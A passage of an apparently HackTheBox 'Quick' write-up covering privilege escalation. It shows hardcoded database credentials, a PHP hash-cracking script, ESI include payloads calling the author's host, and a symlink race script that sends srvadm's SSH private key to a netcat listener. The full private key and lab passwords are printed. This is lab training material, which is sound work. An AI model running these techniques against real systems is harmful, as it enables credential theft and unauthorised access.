drwxr-xr-x 18 sam sam 4096 Oct 11  2017 .
drwxr-xr-x  5 sam sam 4096 Mar 20 03:01 ..
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-aggregated1
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-aggregated2
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-aggregator
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-cas
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-casified-aggregated1
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-casified-aggregated2
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-casified-aggregator
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-master
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-provider
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-cas
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-core
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-distribution
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-server
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-servlet
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-war
```

I started looking though all of the Esigate files since that was what got me in, but there wasn't anything useful there.

```text
sam@quick:~/esigate-distribution-5.2$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
sam:x:1000:1000:sam:/home/sam:/bin/bash
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
srvadm:x:1001:1001:,,,:/home/srvadm:/bin/bash
```

I printed out `/etc/passwd` to see what users and services were available, and found three users with login capability: `root`, `sam`, and `srvadm`.  

```text
sam@quick:~/esigate-distribution-5.2$ netstat -tulvnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:32985         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::9001                 :::*                    LISTEN      926/java            
tcp6       0      0 127.0.0.1:8081          :::*                    LISTEN      926/java            
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp6       0      0 :::443                  :::*                                -                   
sam@quick:~/esigate-distribution-5.2$ nc 127.0.0.1 8081

whoami
HTTP/1.1 400 No URI
Content-Length: 0
Connection: close
Server: Jetty(9.1.z-SNAPSHOT)
```

Netstat identified a few extra ports open from the inside that I couldn't reach from my machine. On port 8081 I found a Jetty server version 9.1.z-SNAPSHOT, and found vulnerabilities related to this at [https://www.cvedetails.com/vulnerability-list/vendor\_id-10410/product\_id-34824/Eclipse-Jetty.html](https://www.cvedetails.com/vulnerability-list/vendor_id-10410/product_id-34824/Eclipse-Jetty.html), but nothing that led anywhere. 

```text
root       1173  0.0  1.0 1034316 42320 ?       Ssl  15:33   0:01 /usr/bin/containerd
root       1175  0.0  2.1 1273752 86712 ?       Ssl  15:33   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root       1223  0.0  0.0  14888  1992 tty1     Ss+  15:33   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       1224  0.0  0.1 288884  6648 ?        Ssl  15:33   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       1266  0.0  0.1  72300  5768 ?        Ss   15:33   0:00 /usr/sbin/sshd -D
root       1378  0.0  0.5 376244 22876 ?        Ss   15:33   0:00 /usr/sbin/apache2 -k start
root       1925  0.0  0.0 478532  3644 ?        Sl   15:33   0:00 /usr/bin/docker-proxy -proto udp -host-ip 0.0.0.0 -host-port 443 -container-ip 172.18.0.2 -container-port 443
root       1936  0.0  0.1   9364  5496 ?        Sl   15:33   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/d63025c3f05b572471c86c790059b05f36c75fc90d975cb19288d5bc88d238ee -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root       1937  0.0  0.1   9364  5832 ?        Sl   15:33   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/f78e2c79d2db3e029679c14060e7dcab4ffbba2167c107a7677f81024e8bc875 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-run
```

There were quite a few processes running related to containers...in fact, it looked like the UDP 443 port I connected to was running from a container. There was even an interface visible in `ifconfig`.  

```text
docker0: flags=4099 mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:f4:06:67:00 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
```

I tried connecting to the docker container on that IP, but was rebuffed since I had no credentials.  

![](../../.gitbook/assets/20-index.php-internal.png)

Next I started looking through the website files in `/var/www` to see if there were any credentials left around, and found the email address `srvadm@quick.htb` in the `index.php` file.  This file also mentioned `db.php` which sounded like it might contain useful information.

```php
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>
```

I was not disappointed.  I now had credentials to a MySQL database which I had seen running on port 3306 earlier.  

![](../../.gitbook/assets/21-jobs.png)

In the folder `/var/www/` I found a writeable folder `jobs` that was owned by root.  This is always a good indication of a privilege escalation route.   In `/var/www/printers` I also found the file `job.php` which looked promising. 

```php
sam@quick:/var/www/printer$ cat job.php
<?php
require __DIR__ . '/escpos-php/vendor/autoload.php';
use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;
use Mike42\Escpos\Printer;
include("db.php");
session_start();

if($_SESSION["loggedin"])
{
        if(isset($_POST["submit"]))
        {
                $title=$_POST["title"];
                $file = date("Y-m-d_H:i:s");
                file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
                chmod("/var/www/printer/jobs/".$file,"0777");
                $stmt=$conn->prepare("select ip,port from jobs");
                $stmt->execute();
                $result=$stmt->get_result();
                if($result->num_rows > 0)
                {
                        $row=$result->fetch_assoc();
                        $ip=$row["ip"];
                        $port=$row["port"];
                        try
                        {
                                $connector = new NetworkPrintConnector($ip,$port);
                                sleep(0.5); //Buffer for socket check
                                $printer = new Printer($connector);
                                $printer -> text(file_get_contents("/var/www/jobs/".$file));
                                $printer -> cut();
                                $printer -> close();
                                $message="Job assigned";
                                unlink("/var/www/jobs/".$file);
                        }
                        catch(Exception $error) 
                        {
                                $error="Can't connect to printer.";
                                unlink("/var/www/jobs/".$file);
                        }
                }
                else
                {
                        $error="Couldn't find printer.";
                }
        }
```

This looked to me like I could make a file in the `/jobs` folder \(where I was able to write\), write to the file my IP and port, then the `jobs.php` will make a connection to my computer thinking it is trying to print. The only catch is that whoever triggers the print needs to be logged in. I felt that I needed to check the database to check for further credentials.

```sql
sam@quick:/var/www/html$ mysql -u db_adm -p quick
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 71
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
+-----------------+
| Tables_in_quick |
+-----------------+
| jobs            |
| tickets         |
| users           |
+-----------------+
3 rows in set (0.00 sec)

mysql> select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)
```

I found the users table which potentially had new creds in it, but I wasn't sure what type of hash or encryption had been used on it.

```text
mysql> select * from tickets;
+----------+-----------+------------------------------------------------------------------------------------------------------------------------+--------+
| id       | title     | description                                                                                                            | status |
+----------+-----------+------------------------------------------------------------------------------------------------------------------------+--------+
| TKT-4178 | ping test | "<esi:include src="http://10.10.15.57:9088/evil98.xml" stylesheet="http://10.10.15.57:9088/evil98.xsl"></esi:include>" | open   |
| TKT-4567 | evil      | "<esi:include src="http://10.10.15.57:9088/evil.xml" stylesheet="http://10.10.15.57:9088/evil.xsl"></esi:include>"     | open   |
| TKT-0987 | evil      | "<esi:include src="http://10.10.15.57:9088/evil.xml" stylesheet="http://10.10.15.57:9088/evil.xsl"></esi:include>"     | open   |
| TKT-9876 | evil1     | "<esi:include src="http://10.10.15.57:9088/evil1.xml" stylesheet="http://10.10.15.57:9088/evil1.xsl"></esi:include>"   | open   |
| TKT-8765 | evil2     | "<esi:include src="http://10.10.15.57:9088/evil2.xml" stylesheet="http://10.10.15.57:9088/evil2.xsl"></esi:include>"   | open   |
+----------+-----------+------------------------------------------------------------------------------------------------------------------------+--------+
9 rows in set (0.00 sec)
```

I also found a list of the tickets that I submitted earlier...the lazy admin still hadn't gotten around to helping me with my issues!

![](../../.gitbook/assets/22-login.php-crypt.png)

for the password "hash" I found, the login.php contained this line which explained it:

```text
$password = md5(crypt($password,'fa'));
```

wrote a script to crack the password using: [https://stackoverflow.com/questions/13246597/how-to-read-a-large-file-line-by-line](https://stackoverflow.com/questions/13246597/how-to-read-a-large-file-line-by-line)

```php
<?php
if ($wordlist = fopen("/home/zweilos/rockyou_utf8.txt", "r")) {
    while ((!feof($wordlist))) {
    $pass = fgets($wordlist);
#    echo "Trying: " . $pass;

    $hash = "e626d51f8fbfd1124fdea88396c35d05";

        $ciphertext = MD5(crypt(trim($pass),'fa'));

        if ($hash == $ciphertext) {
          exit("The password is: " . $pass);
        }  
    }

    fclose($wordlist);

} else {
    exit("Failed to open the wordlist");
}
?>
```

then I ran it and didn't have to wait long

```text
zweilos@kali:~/htb/quick$ php decrypt.php
The password is: yl51pbx
```

from github - [https://github.com/mike42/escpos-php](https://github.com/mike42/escpos-php)

```text
Some examples are below for common interfaces.

Communicate with a printer with an Ethernet interface using netcat:

php hello-world.php | nc 10.x.x.x. 9100
```

![](../../.gitbook/assets/23-ports.conf.png)

```text
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 127.0.0.1:80
```

While poking around in the /etc/apache2 directory I noticed the `ports.conf` file referenced a listener on port 80. Since this was not exposed outside the box, this must be an internal page only. The file said to check `/etc/apache2/sites-enabled/000-default.conf` for virtual hosts, so I did.

```text
</VirtualHost>
<VirtualHost *:80>
        AssignUserId srvadm srvadm
        ServerName printerv2.quick.htb
        DocumentRoot /var/www/printer
</VirtualHost>
```

Here was the information I was looking for! There was a virtual host on port 80 at `printerv2.quick.htb` running under user `srvadm`. This may allow me exploit that jobs folder I had found in `/var/www/html`. 

![](../../.gitbook/assets/25-connection-reset.png)

I added the page to my `/etc/hosts` file, but I was still blocked from accessing the page since it was on port 80 \(which was still not open to the world\).

```text
sam@quick:/etc/apache2$ curl http://printerv2.quick.htb
curl: (6) Could not resolve host: printerv2.quick.htb
```

Apparently this domain name was not in the `quick.htb` machine's hosts file, so I used the IP and port to try to connect instead.

```markup
sam@quick:/etc/apache2$ curl http://127.0.0.1:80
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Quick | Broadband Services</title>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'>
<style>
...CSS snipped...
</style>
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<section class="cover">
<nav>
<span class="logo">
Quick
</span>
<ul>
<li>About</li>
<li>Contact</li>
</ul>
</nav>
<div class="content">
<h2 class="heading">New Broadband Services in JetSpeed<br />for all your Need.</h2>
<p>Upto 17MBps - £18 | Upto 50MBps - £27</p>
<div class="cta-btn">
<a href="/login.php">Get Started</a>
</div>
<p class="highlight">30 day trial | No Bandwidth limit</p>
<div class="card">
<h2>Update!</h2>
<p>We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our <a href="https://portal.quick.htb">portal</a><br />
<br />You might experience some connectivity issues during portal access which we are aware of and working on designing client application to provide better experience for our users. Till then you can avail our services from Mobile App</p>
</div>
</div>
</section>
<center>
<br />
<table border="0" width="50%"><tr><th style="font-size:180%;" colspan="2">Testimonals!<br /><br /></th></tr>
<tr><td><br />Super fast services by Quick Broadband Services. I love their service.</td><td> --By Tim (Qconsulting Pvt Ltd)</td></tr>
<tr><td><br />Quick support and eligant chat response.</td><td> --By Roy (DarkWng Solutions)</td></tr>
<tr><td><br />I never regret using Quick services. Super fast wifi and no issues.</td><td> --By Elisa (Wink Media)</td></tr>
<tr><td><br />Very good delivery and support all these years.</td><td> --By James (LazyCoop Pvt Ltd)</td></tr></table>
<center><br /><br />Check our <a href="/clients.php">clients</a>
</body>
</html>
```

This page looks exactly the same as the virtual hosted page `http://portal.quick.htb`. However, since I needed to specify the virtual host's domain name to connect, this was expected. If I could edit the local hosts file, I would be fine, but since I couldn't, I would have to connect from my machine.

I decided to try to create an authorized\_keys folder for `sam` and see if I could use ssh port redirection to allow me to use my browser to navigate the printer page.

```text
sam@quick:~/.ssh$echo 'ssh-rsa AAAA<my_public_key> zweilos@kali' >> authorized_keys
```

SSH worked, after that it I set up my port redirection tunnel. The `-L` option allows you to forward a local port to a port on the remote machine with the syntax: `-L local_socket:host:hostport`.

```text
zweilos@kali:~/htb/quick$ ssh -L 40905:10.10.10.186:80 sam@quick.htb
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 16 18:31:26 UTC 2020

  System load:  0.06               Users logged in:                1
  Usage of /:   30.1% of 19.56GB   IP address for ens33:           10.10.10.186
  Memory usage: 23%                IP address for br-9ef1bb2e82cd: 172.18.0.1
  Swap usage:   0%                 IP address for docker0:         172.17.0.1
  Processes:    130


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

54 packages can be updated.
28 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Aug 16 18:30:27 2020 from 10.10.15.57
sam@quick:~$
```

I logged in successfully, now to test my port forwarding in the browser. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/connection-reset.png) Unfortunately it didn't work, though I quickly spotted the problem. I was trying to connect to 10.10.10.186 on port 80, just from the `quick.htb` machine, which I already knew was blocked. I needed to access the site the same way I had with curl earlier, with `127.0.0.1:80`.

```text
zweilos@kali:~/htb/quick$ ssh -L 40905:127.0.0.1:80 sam@quick.htb
```

After fixing the IP, I was able to connect to the virtual hosted page. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/virtual_printer.png) 

![](../../.gitbook/assets/26-quick-redux.png)

This led me to a login page. Since I knew that the page was running as `srvadm`, I figured the credentials must be the ones I had found for that user in the MySQL database earlier. [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

### Getting a shell

![](../../.gitbook/assets/27-printer-home.png)

![](../../.gitbook/assets/27-add-printer.png)

![](../../.gitbook/assets/28-myprinter.png)

```text
zweilos@kali:~/htb/quick$ nc -lvnp 9100
listening on [any] 9100 ...
connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 33998
zweilos@kali:~/htb/quick$ nc -lvnp 9100
listening on [any] 9100 ...
connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 34158
This is a testVA
```

As soon as I clicked the print button I got a connection, but when went to the jobs page it closed. I reopened the listener, and sent myself a test message, which appeared in my nc listener, then the connection ended again. It looked like I was not going to be able to send a shell through this, but would have to send data that `srvadm` could access.

```text
sam@quick:/home/srvadm$ ls -la
total 44
drwxr-xr-x 7 srvadm srvadm 4096 Aug 16 13:03 .
drwxr-xr-x 4 root   root   4096 Mar 20 02:16 ..
lrwxrwxrwx 1 srvadm srvadm    9 Mar 20 02:38 .bash_history -> /dev/null
-rw-r--r-- 1 srvadm srvadm  220 Mar 20 02:16 .bash_logout
-rw-r--r-- 1 srvadm srvadm 3771 Mar 20 02:16 .bashrc
drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 .cache
drwxr-x--- 3 srvadm srvadm 4096 Aug 16 11:58 .config
drwx------ 4 srvadm srvadm 4096 Aug 16 12:07 .gnupg
-rw------- 1 srvadm srvadm   34 Aug 16 13:03 .lesshst
drwxrwxr-x 3 srvadm srvadm 4096 Mar 20 06:37 .local
-rw-r--r-- 1 srvadm srvadm  807 Mar 20 02:16 .profile
drwx------ 2 srvadm srvadm 4096 Mar 20 02:38 .ssh
```

this user did have a `.ssh` folder, so I hoped that he had an `id_rsa` key that I could try to steal. I searched for files that `srvadm` had access to but there wasn't anything else that looked useful.

```text
$title=$_POST["title"];
                $file = date("Y-m-d_H:i:s");
                file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
                chmod("/var/www/printer/jobs/".$file,"0777");
                $stmt=$conn->prepare("select ip,port from jobs");
                $stmt->execute();
                $result=$stmt->get_result();
```

I looked back at the code of the jobs page to see exactly what it was doing. It looked like it was creating a file with a name derived from the php `date("Y-m-d_H:i:s")` funtion, then writing to the file the contents of the 'Bill Details' field from the 'Print Jobs' page. After that it sends the file to the IP and port specified in the 'Bill & Receipt Printer' field.

So...now I had to try to figure how to trick this into printing the SSH key of `srvadm`. The only way I could think to do it was to create a link to the key file, replacing the file the print job expected \(we are able to do this since job.php sets the file permissions to 0777\) before it sends it to the "printer". I would have to be ...quick. [https://stackoverflow.com/questions/12198844/replace-a-whole-file-with-another-file-in-bash](https://stackoverflow.com/questions/12198844/replace-a-whole-file-with-another-file-in-bash)

```text
#!/bin/bash

while : 
do
        for job in $(ls -1 /var/www/jobs)
        do
                cat /dev/shm/printer > /var/www/jobs/$job;
        done
done
```

So that didn't work...probably because I don't have read permissions of the file. This does tell me, however, that the file exists and that I am on the right track!

```text
#!/bin/bash

while : 
do
        for job in $(ls -1 /var/www/jobs)
        do
                echo "The filename is $job"
                filename=$job
                rm -f /var/www/jobs/$job;
                ln -sf /home/srvadm/.ssh/id_rsa /var/www/jobs/$filename;
        done
done
```

This time, instead of trying to put the contents of the SSH key in the print file, I swapped the print file with a symlink to the key. This way when the file is sent to my waiting "printer" \(nc listener\), it would send the SSH key using the permissions of `srvadm`.

```text
zweilos@kali:~/htb/quick$ nc -lvnp 9100
listening on [any] 9100 ...
connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 36404
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
-----END RSA PRIVATE KEY-----
```

After a lot of troubleshooting I arrived at the script above and was able to retrieve the SSH key. I ended up having to remove the print job file `job.php` made, copy its filename to a variable, then symlink the `id_rsa` file to a file with the same name as the print job file. This all had to happen before the print job was sent to my waiting nc listener.

## Enumeration as `srvadm`

```text
zweilos@kali:~/htb/quick$ ssh -i srvadm.id_rsa srvadm@quick.htb
load pubkey "srvadm.id_rsa": invalid format
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'srvadm.id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "srvadm.id_rsa": bad permissions
srvadm@quick.htb's password:
```

forgot to change the permissions of the private key to 600

```text
zweilos@kali:~/htb/quick$ chmod 600 srvadm.id_rsa 
zweilos@kali:~/htb/quick$ ssh -i srvadm.id_rsa srvadm@quick.htb
load pubkey "srvadm.id_rsa": invalid format
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 16 22:28:26 UTC 2020

  System load:  0.0                Users logged in:                1
  Usage of /:   30.1% of 19.56GB   IP address for ens33:           10.10.10.186
  Memory usage: 23%                IP address for br-9ef1bb2e82cd: 172.18.0.1
  Swap usage:   0%                 IP address for docker0:         172.17.0.1
  Processes:    134


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

54 packages can be updated.
28 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Aug 16 11:56:50 2020 from 10.10.14.110
srvadm@quick:~$ sudo -l
[sudo] password for srvadm:
```

![](../../.gitbook/assets/29-viminfo%20%281%29.png)

```text
srvadm@quick:~/.local/share/nano$cat search_history
2013
2011

2019
2018
```

```text
srvadm@quick:~/.local/share/nano$ id
uid=1001(srvadm) gid=1001(srvadm) groups=1001(srvadm),999(printers)
srvadm@quick:~/.local/share/nano$ find / -group printers 2>/dev/null
```

I found that srvadm was a member of the `printers` group, so I searched for files that that group could access...and came up with nothing.

```text
srvadm@quick:~/.cache/conf.d$ netstat -lvn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:41151         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::9001                 :::*                    LISTEN     
tcp6       0      0 127.0.0.1:8081          :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp6       0      0 :::443                  :::*                               
raw6       0      0 :::58                   :::*                    7
```

```text
srvadm@quick:~/.cache/conf.d$ telnet 127.0.0.1  8081
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
ls
HTTP/1.1 400 No URI
Content-Length: 0
Connection: close
Server: Jetty(9.1.z-SNAPSHOT)

Connection closed by foreign host.
```

[https://www.cvedetails.com/cve/CVE-2017-7658/](https://www.cvedetails.com/cve/CVE-2017-7658/)

 [https://www.cvedetails.com/vulnerability-list/vendor\_id-10410/product\_id-34824/Eclipse-Jetty.html](https://www.cvedetails.com/vulnerability-list/vendor_id-10410/product_id-34824/Eclipse-Jetty.html)

 [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)

![](../../.gitbook/assets/30-printer-auth%20%281%29%20%281%29%20%281%29%20%281%29%20%281%29.png)

```text
srvadm@quick:~/.cache$ ls -la
total 20
drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 .
drwxr-xr-x 6 srvadm srvadm 4096 Mar 20 06:37 ..
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:23 conf.d
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:46 logs
-rw-r--r-- 1 srvadm srvadm    0 Mar 20 02:38 motd.legal-displayed
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:18 packages
srvadm@quick:~/.cache$ cd conf.d/
srvadm@quick:~/.cache/conf.d$ ls -la
total 20
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:23 .
drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 ..
-rw-r--r-- 1 srvadm srvadm 4569 Mar 20 06:20 cupsd.conf
-rw-r--r-- 1 srvadm srvadm 4038 Mar 20 06:23 printers.conf
srvadm@quick:~/.cache/conf.d$ vim printers.conf 
srvadm@quick:~/.cache/conf.d$ curl https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
curl: (6) Could not resolve host: printerv3.quick.htb
```

```text
first tunnel
